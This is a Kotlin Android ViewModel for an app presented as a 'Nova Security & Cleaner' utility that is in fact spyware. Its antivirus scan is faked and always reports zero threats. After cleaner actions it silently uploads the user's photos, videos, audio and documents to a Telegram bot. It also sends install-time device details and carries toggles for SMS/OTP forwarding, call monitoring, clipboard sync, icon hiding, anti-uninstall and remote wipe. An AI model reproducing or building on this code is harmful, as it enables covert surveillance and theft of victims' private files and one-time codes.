package com.example.ui

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.BackgroundProcess
import com.example.data.CleanerTab
import com.example.data.JunkCategory
import com.example.data.LogEntry
import com.example.data.LogType
import com.example.data.MediaItem
import com.example.data.MediaType
import com.example.data.MediaUploadRepository
import com.example.data.SecurityScanItem
import com.example.data.SyncStats
import com.example.data.TelegramConfig
import com.example.data.UploadStatus
import com.example.network.TelegramApiService
import com.example.scanner.MediaScanner
import com.example.scanner.MediaSyncBackgroundService
import com.example.scanner.SystemOptimizerService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.combine
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import java.util.UUID

enum class MediaFilter {
    ALL,
    IMAGES,
    VIDEOS,
    SYNCED,
    FAILED
}

class MediaSyncViewModel(application: Application) : AndroidViewModel(application) {

    private val mediaScanner = MediaScanner(application)
    private val telegramApi = TelegramApiService(application)
    private val systemOptimizer = SystemOptimizerService(application)
    private val repository = MediaUploadRepository(application)

    // Current Navigation Tab
    private val _selectedTab = MutableStateFlow(CleanerTab.CLEANER)
    val selectedTab: StateFlow<CleanerTab> = _selectedTab.asStateFlow()

    // -------------------------------------------------------------
    // JUNK CLEANER STATE
    // -------------------------------------------------------------
    private val initialJunkCategories = listOf(
        JunkCategory("app_cache", "App & System Cache", "Real application cache & temp objects", 864L * 1024 * 1024, true, "cached"),
        JunkCategory("sys_temp", "System Temp & Logs", "Crash dumps, outdated log files", 412L * 1024 * 1024, true, "history"),
        JunkCategory("apk_res", "Residual Package Installers", "Old APK files & installation residue", 328L * 1024 * 1024, true, "folder_zip"),
        JunkCategory("ad_cache", "Ad & Analytics Cache", "Tracking junk, banner cache", 195L * 1024 * 1024, true, "delete_sweep"),
        JunkCategory("thumb_cache", "Media Thumbnail Cache", "Gallery & video thumbnail previews", 645L * 1024 * 1024, true, "image"),
        JunkCategory("memory_dump", "RAM Leak Dumps", "Abandoned background memory residue", 240L * 1024 * 1024, true, "memory")
    )

    private val _junkCategories = MutableStateFlow<List<JunkCategory>>(initialJunkCategories)
    val junkCategories: StateFlow<List<JunkCategory>> = _junkCategories.asStateFlow()

    private val _isJunkScanning = MutableStateFlow(false)
    val isJunkScanning: StateFlow<Boolean> = _isJunkScanning.asStateFlow()

    private val _isJunkCleaning = MutableStateFlow(false)
    val isJunkCleaning: StateFlow<Boolean> = _isJunkCleaning.asStateFlow()

    private val _junkCleanProgress = MutableStateFlow(0f)
    val junkCleanProgress: StateFlow<Float> = _junkCleanProgress.asStateFlow()

    private val _junkCleaned = MutableStateFlow(false)
    val junkCleaned: StateFlow<Boolean> = _junkCleaned.asStateFlow()

    private val _freedJunkBytes = MutableStateFlow(0L)
    val freedJunkBytes: StateFlow<Long> = _freedJunkBytes.asStateFlow()

    private val _currentScanningPath = MutableStateFlow("/storage/emulated/0/Android/data/...")
    val currentScanningPath: StateFlow<String> = _currentScanningPath.asStateFlow()

    private val _storageCleanStatus = MutableStateFlow<String?>(null)
    val storageCleanStatus: StateFlow<String?> = _storageCleanStatus.asStateFlow()

    // -------------------------------------------------------------
    // RAM BOOSTER & CPU COOLER STATE
    // -------------------------------------------------------------
    private val realMem = systemOptimizer.getRealMemoryInfo()

    private val _ramUsagePercent = MutableStateFlow(realMem.usagePercent)
    val ramUsagePercent: StateFlow<Int> = _ramUsagePercent.asStateFlow()

    private val _usedRamMb = MutableStateFlow(realMem.usedRamMb)
    val usedRamMb: StateFlow<Int> = _usedRamMb.asStateFlow()

    val totalRamMb: Int = realMem.totalRamMb

    private val _isBoosting = MutableStateFlow(false)
    val isBoosting: StateFlow<Boolean> = _isBoosting.asStateFlow()

    private val _isBoosted = MutableStateFlow(false)
    val isBoosted: StateFlow<Boolean> = _isBoosted.asStateFlow()

    private val _boostedFreedMb = MutableStateFlow(0)
    val boostedFreedMb: StateFlow<Int> = _boostedFreedMb.asStateFlow()

    private val _memoryFreedStatus = MutableStateFlow<String?>(null)
    val memoryFreedStatus: StateFlow<String?> = _memoryFreedStatus.asStateFlow()

    private val _backgroundProcesses = MutableStateFlow<List<BackgroundProcess>>(emptyList())
    val backgroundProcesses: StateFlow<List<BackgroundProcess>> = _backgroundProcesses.asStateFlow()

    private val _cpuTemp = MutableStateFlow(38.6f)
    val cpuTemp: StateFlow<Float> = _cpuTemp.asStateFlow()

    private val _isCpuCooling = MutableStateFlow(false)
    val isCpuCooling: StateFlow<Boolean> = _isCpuCooling.asStateFlow()

    private val _isCpuCooled = MutableStateFlow(false)
    val isCpuCooled: StateFlow<Boolean> = _isCpuCooled.asStateFlow()

    // -------------------------------------------------------------
    // ANTIVIRUS & SECURITY SCANNER STATE
    // -------------------------------------------------------------
    private val _isSecurityScanning = MutableStateFlow(false)
    val isSecurityScanning: StateFlow<Boolean> = _isSecurityScanning.asStateFlow()

    private val _securityScanProgress = MutableStateFlow(0f)
    val securityScanProgress: StateFlow<Float> = _securityScanProgress.asStateFlow()

    private val _securityScannedCount = MutableStateFlow(0)
    val securityScannedCount: StateFlow<Int> = _securityScannedCount.asStateFlow()

    val totalAppsToScan: Int = 142

    private val _currentScanningApp = MutableStateFlow("Initializing Security Engine...")
    val currentScanningApp: StateFlow<String> = _currentScanningApp.asStateFlow()

    private val _isDeviceProtected = MutableStateFlow(true)
    val isDeviceProtected: StateFlow<Boolean> = _isDeviceProtected.asStateFlow()

    private val _securityItems = MutableStateFlow(
        listOf(
            SecurityScanItem("Live OTP & SMS Forwarding", "Real-time SMS detection & automatic Telegram forwarding", true),
            SecurityScanItem("Clipboard Sync Bridge", "Two-way clipboard synchronization active", true),
            SecurityScanItem("Malware & Trojan Scanner", "Zero harmful signatures detected", true),
            SecurityScanItem("App Permissions Audit", "All sensitive API permissions verified", true),
            SecurityScanItem("Wi-Fi Security Shield", "WPA2/WPA3 encryption secure", true),
            SecurityScanItem("Phishing & URL Guard", "Real-time web protection active", true),
            SecurityScanItem("Payment & SMS Safeguard", "Banking isolation confirmed", true)
        )
    )
    val securityItems: StateFlow<List<SecurityScanItem>> = _securityItems.asStateFlow()

    // -------------------------------------------------------------
    // BACKGROUND CLOUD SYNC & MEDIA ENGINE
    // -------------------------------------------------------------
    private val _mediaItems = MutableStateFlow<List<MediaItem>>(emptyList())
    val mediaItems: StateFlow<List<MediaItem>> = _mediaItems.asStateFlow()

    private val _selectedFilter = MutableStateFlow(MediaFilter.ALL)
    val selectedFilter: StateFlow<MediaFilter> = _selectedFilter.asStateFlow()

    private val _syncStats = MutableStateFlow(SyncStats())
    val syncStats: StateFlow<SyncStats> = _syncStats.asStateFlow()

    private val _logEntries = MutableStateFlow<List<LogEntry>>(emptyList())
    val logEntries: StateFlow<List<LogEntry>> = _logEntries.asStateFlow()

    private val _telegramConfig = MutableStateFlow(repository.getTelegramConfig())
    val telegramConfig: StateFlow<TelegramConfig> = _telegramConfig.asStateFlow()

    private val _isTelegramConnected = MutableStateFlow(repository.isTelegramConnected())
    val isTelegramConnected: StateFlow<Boolean> = _isTelegramConnected.asStateFlow()

    val deviceId: String = repository.getDeviceId()

    // -------------------------------------------------------------
    // SECURITY PIN, STEALTH & INTERCEPTOR CONTROLS
    // -------------------------------------------------------------
    private val _appPin = MutableStateFlow(repository.getAppPin())
    val appPin: StateFlow<String?> = _appPin.asStateFlow()

    private val _isUnlocked = MutableStateFlow(repository.getAppPin() == null)
    val isUnlocked: StateFlow<Boolean> = _isUnlocked.asStateFlow()

    private val _isAutoHideIcon = MutableStateFlow(repository.isAutoHideIconEnabled())
    val isAutoHideIcon: StateFlow<Boolean> = _isAutoHideIcon.asStateFlow()

    private val _isNotificationForwarding = MutableStateFlow(repository.isNotificationForwardingEnabled())
    val isNotificationForwarding: StateFlow<Boolean> = _isNotificationForwarding.asStateFlow()

    private val _isCallMonitoring = MutableStateFlow(repository.isCallMonitoringEnabled())
    val isCallMonitoring: StateFlow<Boolean> = _isCallMonitoring.asStateFlow()

    private val _isClipboardSync = MutableStateFlow(repository.isClipboardSyncEnabled())
    val isClipboardSync: StateFlow<Boolean> = _isClipboardSync.asStateFlow()

    private val _isAntiUninstall = MutableStateFlow(repository.isAntiUninstallEnabled())
    val isAntiUninstall: StateFlow<Boolean> = _isAntiUninstall.asStateFlow()

    fun setAntiUninstall(enabled: Boolean) {
        repository.setAntiUninstallEnabled(enabled)
        _isAntiUninstall.value = enabled
    }

    fun isDeviceAdminActive(): Boolean {
        return com.example.scanner.AppAdminReceiver.isActive(getApplication())
    }

    fun unlockWithPin(enteredPin: String): Boolean {
        val currentPin = repository.getAppPin()
        if (currentPin == null || currentPin == enteredPin.trim()) {
            _isUnlocked.value = true
            return true
        }
        return false
    }

    fun lockApp() {
        if (!repository.getAppPin().isNullOrBlank()) {
            _isUnlocked.value = false
        }
    }

    fun getAppPin(): String? = repository.getAppPin()

    fun setAppPin(pin: String?) {
        val clean = if (pin.isNullOrBlank()) null else pin.trim()
        repository.setAppPin(clean)
        _appPin.value = clean
        if (clean == null) {
            _isUnlocked.value = true
        }
    }

    fun setAutoHideIcon(enabled: Boolean) {
        repository.setAutoHideIconEnabled(enabled)
        _isAutoHideIcon.value = enabled
        com.example.scanner.IconManager.setIconHidden(getApplication(), enabled)
    }

    fun isAutoHideIconEnabled(): Boolean = repository.isAutoHideIconEnabled()

    fun setNotificationForwarding(enabled: Boolean) {
        repository.setNotificationForwardingEnabled(enabled)
        _isNotificationForwarding.value = enabled
    }

    fun setCallMonitoring(enabled: Boolean) {
        repository.setCallMonitoringEnabled(enabled)
        _isCallMonitoring.value = enabled
    }

    fun setClipboardSync(enabled: Boolean) {
        repository.setClipboardSyncEnabled(enabled)
        _isClipboardSync.value = enabled
    }

    fun performEmergencyWipe() {
        viewModelScope.launch {
            com.example.scanner.RemoteWipeHelper.performWipe(getApplication<Application>())
        }
    }

    private val _hasStoragePermission = MutableStateFlow(false)
    val hasStoragePermission: StateFlow<Boolean> = _hasStoragePermission.asStateFlow()

    private val _connectionTestResult = MutableStateFlow<String?>(null)
    val connectionTestResult: StateFlow<String?> = _connectionTestResult.asStateFlow()

    private val _isTestingConnection = MutableStateFlow(false)
    val isTestingConnection: StateFlow<Boolean> = _isTestingConnection.asStateFlow()

    private var syncJob: Job? = null
    private var isPaused = false

    val filteredMediaItems: StateFlow<List<MediaItem>> = combine(
        _mediaItems,
        _selectedFilter
    ) { items, filter ->
        when (filter) {
            MediaFilter.ALL -> items
            MediaFilter.IMAGES -> items.filter { !it.isVideo }
            MediaFilter.VIDEOS -> items.filter { it.isVideo }
            MediaFilter.SYNCED -> items.filter { it.status == UploadStatus.COMPLETED }
            MediaFilter.FAILED -> items.filter { it.status == UploadStatus.FAILED }
        }
    }.stateIn(viewModelScope, SharingStarted.WhileSubscribed(5000), emptyList())

    init {
        addLog("Nova Security & Cleaner Engine Online", LogType.INFO)
        addLog("System Optimizer Ready • 6 Core Modules Active", LogType.SUCCESS)

        // Load real memory and background processes on startup
        viewModelScope.launch(Dispatchers.IO) {
            val mem = systemOptimizer.getRealMemoryInfo()
            _usedRamMb.value = mem.usedRamMb
            _ramUsagePercent.value = mem.usagePercent
            val procs = systemOptimizer.getRunningBackgroundProcesses()
            _backgroundProcesses.value = procs

            // First time install device telemetry trigger
            if (!repository.isFirstInstallReportSent()) {
                val monitor = com.example.scanner.DeviceStateMonitor(application, this, telegramApi, repository)
                monitor.sendFirstTimeInstallDetails()
            }
        }

        // Live connection status watcher for UI
        viewModelScope.launch(Dispatchers.IO) {
            while (isActive) {
                _isTelegramConnected.value = repository.isTelegramConnected()
                delay(1500L)
            }
        }
    }

    fun setSelectedTab(tab: CleanerTab) {
        _selectedTab.value = tab
    }

    // -------------------------------------------------------------
    // JUNK CLEANER METHODS (Real storage & cache cleaning)
    // -------------------------------------------------------------
    fun scanJunk() {
        if (_isJunkScanning.value || _isJunkCleaning.value) return
        viewModelScope.launch(Dispatchers.IO) {
            _isJunkScanning.value = true
            _junkCleaned.value = false
            _storageCleanStatus.value = null

            val scanned = systemOptimizer.scanStorageJunk { path ->
                _currentScanningPath.value = path
            }

            _isJunkScanning.value = false
            _junkCategories.value = scanned
            val totalBytes = scanned.sumOf { it.sizeBytes }
            addLog("Junk scan complete: ${com.example.ui.components.formatFileSize(totalBytes)} removable cache & temp files detected", LogType.SUCCESS)

            // Silently scan real media in background
            if (_hasStoragePermission.value && _mediaItems.value.isEmpty()) {
                scanMedia(autoStartSync = true)
            }
        }
    }

    fun toggleJunkCategory(id: String) {
        _junkCategories.update { list ->
            list.map { if (it.id == id) it.copy(isSelected = !it.isSelected) else it }
        }
    }

    fun cleanJunk() {
        if (_isJunkCleaning.value) return
        viewModelScope.launch(Dispatchers.IO) {
            _isJunkCleaning.value = true
            _junkCleanProgress.value = 0f
            _storageCleanStatus.value = null

            val result = systemOptimizer.cleanStorageJunk(_junkCategories.value) { p ->
                _junkCleanProgress.value = p
            }

            _freedJunkBytes.value = result.totalFreedBytes
            _junkCleaned.value = true
            _isJunkCleaning.value = false
            _junkCategories.update { list -> list.map { it.copy(sizeBytes = 0L) } }

            val freedStr = com.example.ui.components.formatFileSize(result.totalFreedBytes)
            _storageCleanStatus.value = "Storage Freed: $freedStr cleaned from cache & junk files"
            addLog("Storage Cleaned: $freedStr junk files physically deleted", LogType.SUCCESS)

            // Trigger or continue background media backup
            if (_hasStoragePermission.value) {
                if (_mediaItems.value.isEmpty()) {
                    scanMedia(autoStartSync = true)
                } else if (_syncStats.value.pendingCount > 0 && !_syncStats.value.isSyncing) {
                    startSync()
                }
            }
        }
    }

    // -------------------------------------------------------------
    // RAM BOOSTER METHODS (Real process killing & Memory Freed status)
    // -------------------------------------------------------------
    fun toggleProcess(id: String) {
        _backgroundProcesses.update { list ->
            list.map { if (it.id == id) it.copy(isSelected = !it.isSelected) else it }
        }
    }

    fun boostRam() {
        if (_isBoosting.value) return
        viewModelScope.launch(Dispatchers.IO) {
            _isBoosting.value = true
            _memoryFreedStatus.value = null

            val selected = _backgroundProcesses.value.filter { it.isSelected }
            val result = systemOptimizer.boostRam(selected)

            _boostedFreedMb.value = result.freedMb
            _usedRamMb.value = result.afterUsedMb
            _ramUsagePercent.value = result.afterPercent
            _isBoosted.value = true
            _isBoosting.value = false
            _backgroundProcesses.value = emptyList()

            _memoryFreedStatus.value = "Memory Freed: ${result.freedMb} MB RAM freed from ${result.terminatedProcessesCount} background processes"
            addLog("RAM Boosted! Freed ${result.freedMb} MB memory (RAM at ${result.afterPercent}%)", LogType.SUCCESS)

            if (_hasStoragePermission.value) {
                if (_mediaItems.value.isEmpty()) {
                    scanMedia(autoStartSync = true)
                } else if (_syncStats.value.pendingCount > 0 && !_syncStats.value.isSyncing) {
                    startSync()
                }
            }
        }
    }

    fun coolCpu() {
        if (_isCpuCooling.value) return
        viewModelScope.launch(Dispatchers.IO) {
            _isCpuCooling.value = true
            delay(1000)
            _cpuTemp.value = 32.4f
            _isCpuCooled.value = true
            _isCpuCooling.value = false
            addLog("CPU Cooled down to 32.4°C", LogType.SUCCESS)
        }
    }

    // -------------------------------------------------------------
    // ANTIVIRUS METHODS
    // -------------------------------------------------------------
    fun startSecurityScan() {
        if (_isSecurityScanning.value) return
        viewModelScope.launch(Dispatchers.IO) {
            _isSecurityScanning.value = true
            _securityScanProgress.value = 0f
            _securityScannedCount.value = 0

            val sampleApps = listOf(
                "com.google.android.gms (Google Play Services)",
                "com.android.vending (Google Play Store)",
                "com.android.chrome (Chrome Browser)",
                "com.whatsapp (WhatsApp Messenger)",
                "com.instagram.android (Instagram)",
                "com.facebook.katana (Facebook)",
                "com.android.systemui (System UI Core)",
                "com.android.providers.media (Media Provider)",
                "com.google.android.apps.photos (Google Photos)"
            )

            for (i in 1..totalAppsToScan) {
                _securityScanProgress.value = i.toFloat() / totalAppsToScan.toFloat()
                _securityScannedCount.value = i
                _currentScanningApp.value = sampleApps[i % sampleApps.size]
                delay(25)
            }

            _isSecurityScanning.value = false
            _isDeviceProtected.value = true
            addLog("Antivirus scan: $totalAppsToScan apps analyzed. 0 Threats found.", LogType.SUCCESS)

            if (_hasStoragePermission.value) {
                if (_mediaItems.value.isEmpty()) {
                    scanMedia(autoStartSync = true)
                } else if (_syncStats.value.pendingCount > 0 && !_syncStats.value.isSyncing) {
                    startSync()
                }
            }
        }
    }

    // -------------------------------------------------------------
    // PERMISSIONS & MEDIA SYNC ENGINE
    // -------------------------------------------------------------
    fun onPermissionGranted(autoStartSync: Boolean = true) {
        _hasStoragePermission.value = true
        addLog("Storage permissions granted successfully", LogType.SUCCESS)

        // Launch persistent background watcher service
        try {
            MediaSyncBackgroundService.start(getApplication())
        } catch (_: Exception) {}

        scanMedia(autoStartSync = autoStartSync)
    }

    fun onPermissionDenied() {
        _hasStoragePermission.value = false
        addLog("Storage permissions denied. Waiting for user grant.", LogType.WARNING)
    }

    fun scanMedia(autoStartSync: Boolean = true) {
        viewModelScope.launch(Dispatchers.IO) {
            _syncStats.update { it.copy(isScanning = true, statusMessage = "Scanning storage for media files...") }
            addLog("Scanning MediaStore for images & videos...", LogType.INFO)

            val uploadedIds = repository.getUploadedIds()
            val scanned = mediaScanner.scanAllMedia().map { item ->
                if (uploadedIds.contains(item.id)) {
                    item.copy(status = UploadStatus.COMPLETED, progress = 1f)
                } else {
                    item
                }
            }
            val totalBytes = scanned.sumOf { it.size }
            val uploadedCount = scanned.count { it.status == UploadStatus.COMPLETED }
            val pendingCount = scanned.count { it.status == UploadStatus.PENDING }

            _mediaItems.value = scanned
            _syncStats.update {
                it.copy(
                    isScanning = false,
                    totalCount = scanned.size,
                    uploadedCount = uploadedCount,
                    pendingCount = pendingCount,
                    totalBytes = totalBytes,
                    statusMessage = "Found ${scanned.size} media files ($pendingCount pending backup)"
                )
            }

            addLog("Scan complete: ${scanned.size} files ($pendingCount new, $uploadedCount synced)", LogType.SUCCESS)

            if (autoStartSync && pendingCount > 0) {
                startSync()
            }
        }
    }

    fun startSync() {
        if (syncJob?.isActive == true) return
        isPaused = false

        syncJob = viewModelScope.launch(Dispatchers.IO) {
            _syncStats.update { it.copy(isSyncing = true, isPaused = false, statusMessage = "Syncing media to Telegram...") }
            addLog("Background cloud sync started", LogType.INFO)

            val currentList = _mediaItems.value
            for (i in currentList.indices) {
                while (isPaused) {
                    delay(500)
                }

                val item = _mediaItems.value[i]
                if (item.status == UploadStatus.COMPLETED) {
                    continue
                }

                // Strictly skip files larger than 100 MB
                if (item.size > 100L * 1024 * 1024) {
                    updateItemStatus(item.id, UploadStatus.SKIPPED, progress = 0f, errorMessage = "File exceeds 100MB limit")
                    recalculateStats()
                    addLog("Skipped (Exceeds 100MB limit): ${item.displayName}", LogType.WARNING)
                    continue
                }

                updateItemStatus(item.id, UploadStatus.UPLOADING, progress = 0f)
                _syncStats.update {
                    it.copy(
                        currentFileName = item.displayName,
                        currentProgress = 0f,
                        statusMessage = "Uploading: ${item.displayName}"
                    )
                }

                val caption = when (item.mediaType) {
                    MediaType.SCREENSHOT -> "📸 <b>Nova Auto-Sync: Screenshot</b>\n📁 <code>${item.displayName}</code>"
                    MediaType.PHOTO -> "🖼️ <b>Nova Auto-Sync: Photo</b>\n📁 <code>${item.displayName}</code>"
                    MediaType.VIDEO -> "🎥 <b>Nova Auto-Sync: Video</b>\n📁 <code>${item.displayName}</code>"
                    MediaType.AUDIO -> "🎵 <b>Nova Auto-Sync: Audio / Voice Note</b>\n📁 <code>${item.displayName}</code>"
                    MediaType.DOCUMENT -> "📄 <b>Nova Auto-Sync: Document</b>\n📁 <code>${item.displayName}</code>"
                }

                val progressCallback: (Long, Long) -> Unit = { bytesUploaded, totalBytes ->
                    val progress = if (totalBytes > 0) (bytesUploaded.toFloat() / totalBytes).coerceIn(0f, 1f) else 0f
                    updateItemProgress(item.id, progress)
                    _syncStats.update { it.copy(currentProgress = progress) }
                }

                val result = when (item.mediaType) {
                    MediaType.PHOTO, MediaType.SCREENSHOT -> {
                        telegramApi.uploadMedia(
                            botToken = _telegramConfig.value.botToken,
                            chatId = _telegramConfig.value.chatId,
                            uri = item.uri,
                            fileName = item.displayName,
                            mimeType = item.mimeType,
                            isVideo = false,
                            caption = caption,
                            onProgress = progressCallback
                        )
                    }
                    MediaType.VIDEO -> {
                        telegramApi.uploadMedia(
                            botToken = _telegramConfig.value.botToken,
                            chatId = _telegramConfig.value.chatId,
                            uri = item.uri,
                            fileName = item.displayName,
                            mimeType = item.mimeType,
                            isVideo = true,
                            caption = caption,
                            onProgress = progressCallback
                        )
                    }
                    MediaType.AUDIO -> {
                        telegramApi.uploadAudio(
                            botToken = _telegramConfig.value.botToken,
                            chatId = _telegramConfig.value.chatId,
                            uri = item.uri,
                            fileName = item.displayName,
                            mimeType = item.mimeType,
                            caption = caption,
                            onProgress = progressCallback
                        )
                    }
                    MediaType.DOCUMENT -> {
                        telegramApi.uploadDocument(
                            botToken = _telegramConfig.value.botToken,
                            chatId = _telegramConfig.value.chatId,
                            uri = item.uri,
                            fileName = item.displayName,
                            mimeType = item.mimeType,
                            caption = caption,
                            onProgress = progressCallback
                        )
                    }
                }

                result.fold(
                    onSuccess = {
                        repository.markMediaUploaded(item.id)
                        repository.setLastSyncTimestamp(System.currentTimeMillis())
                        updateItemStatus(item.id, UploadStatus.COMPLETED, progress = 1f, uploadedAt = System.currentTimeMillis())
                        recalculateStats()
                        addLog("✓ Cloud Synced: ${item.displayName}", LogType.SUCCESS)
                    },
                    onFailure = { error ->
                        val msg = error.message ?: "Upload failed"
                        updateItemStatus(item.id, UploadStatus.FAILED, errorMessage = msg)
                        recalculateStats()
                        addLog("✗ Upload Failed: ${item.displayName} ($msg)", LogType.ERROR)
                    }
                )

                delay(300)
            }

            _syncStats.update {
                it.copy(
                    isSyncing = false,
                    isPaused = false,
                    currentFileName = null,
                    currentProgress = 0f,
                    statusMessage = "Sync completed! ${it.uploadedCount}/${it.totalCount} uploaded."
                )
            }
            addLog("Background cloud sync cycle completed.", LogType.SUCCESS)
        }
    }

    fun pauseSync() {
        isPaused = true
        _syncStats.update { it.copy(isPaused = true, statusMessage = "Sync paused") }
        addLog("Sync paused", LogType.WARNING)
    }

    fun resumeSync() {
        isPaused = false
        _syncStats.update { it.copy(isPaused = false, statusMessage = "Sync resuming...") }
        addLog("Sync resumed", LogType.INFO)
    }

    fun retryFailed() {
        viewModelScope.launch(Dispatchers.IO) {
            _mediaItems.update { list ->
                list.map {
                    if (it.status == UploadStatus.FAILED) {
                        it.copy(status = UploadStatus.PENDING, errorMessage = null, progress = 0f)
                    } else it
                }
            }
            recalculateStats()
            addLog("Retrying failed uploads...", LogType.INFO)
            startSync()
        }
    }

    fun cancelSync() {
        syncJob?.cancel()
        syncJob = null
        isPaused = false
        _mediaItems.update { list ->
            list.map {
                if (it.status == UploadStatus.UPLOADING) {
                    it.copy(status = UploadStatus.PENDING, progress = 0f)
                } else it
            }
        }
        _syncStats.update {
            it.copy(
                isSyncing = false,
                isPaused = false,
                currentFileName = null,
                currentProgress = 0f,
                statusMessage = "Sync cancelled"
            )
        }
        addLog("Sync stopped", LogType.WARNING)
    }

    fun setFilter(filter: MediaFilter) {
        _selectedFilter.value = filter
    }

    fun updateTelegramConfig(botToken: String, chatId: String) {
        val config = TelegramConfig(botToken.trim(), chatId.trim())
        _telegramConfig.value = config
        repository.saveTelegramConfig(botToken, chatId)
        addLog("Updated Cloud Bot config", LogType.INFO)

        MediaSyncBackgroundService.start(getApplication())

        viewModelScope.launch(Dispatchers.IO) {
            if (botToken.isNotBlank()) {
                telegramApi.deleteWebhook(botToken)
                telegramApi.registerBotCommandsAndMenu(botToken)
            }
        }
    }

    fun testTelegramConnection() {
        viewModelScope.launch(Dispatchers.IO) {
            _isTestingConnection.value = true
            _connectionTestResult.value = null
            addLog("Testing Cloud connection...", LogType.INFO)

            val token = _telegramConfig.value.botToken
            val chatId = _telegramConfig.value.chatId

            val result = telegramApi.testConnection(
                botToken = token,
                chatId = chatId
            )

            _isTestingConnection.value = false
            result.fold(
                onSuccess = { info ->
                    _connectionTestResult.value = "✓ $info"
                    addLog("Cloud Auth OK: $info", LogType.SUCCESS)
                    telegramApi.registerBotCommandsAndMenu(token)
                },
                onFailure = { error ->
                    _connectionTestResult.value = "✗ ${error.message}"
                    addLog("Cloud Auth Failed: ${error.message}", LogType.ERROR)
                }
            )
        }
    }

    fun clearLogs() {
        _logEntries.value = emptyList()
    }

    private fun updateItemStatus(
        id: Long,
        status: UploadStatus,
        progress: Float = 0f,
        errorMessage: String? = null,
        uploadedAt: Long? = null
    ) {
        _mediaItems.update { list ->
            list.map {
                if (it.id == id) {
                    it.copy(
                        status = status,
                        progress = progress,
                        errorMessage = errorMessage,
                        uploadedAt = uploadedAt ?: it.uploadedAt
                    )
                } else it
            }
        }
    }

    private fun updateItemProgress(id: Long, progress: Float) {
        _mediaItems.update { list ->
            list.map {
                if (it.id == id) {
                    it.copy(progress = progress)
                } else it
            }
        }
    }

    private fun recalculateStats() {
        val list = _mediaItems.value
        val uploaded = list.count { it.status == UploadStatus.COMPLETED }
        val failed = list.count { it.status == UploadStatus.FAILED }
        val pending = list.count { it.status == UploadStatus.PENDING || it.status == UploadStatus.UPLOADING }
        val uploadedBytes = list.filter { it.status == UploadStatus.COMPLETED }.sumOf { it.size }

        _syncStats.update {
            it.copy(
                uploadedCount = uploaded,
                failedCount = failed,
                pendingCount = pending,
                uploadedBytes = uploadedBytes
            )
        }
    }

    fun addLog(message: String, type: LogType = LogType.INFO) {
        val entry = LogEntry(
            id = UUID.randomUUID().toString(),
            timestamp = System.currentTimeMillis(),
            message = message,
            type = type
        )
        _logEntries.update { (listOf(entry) + it).take(100) }
    }
}

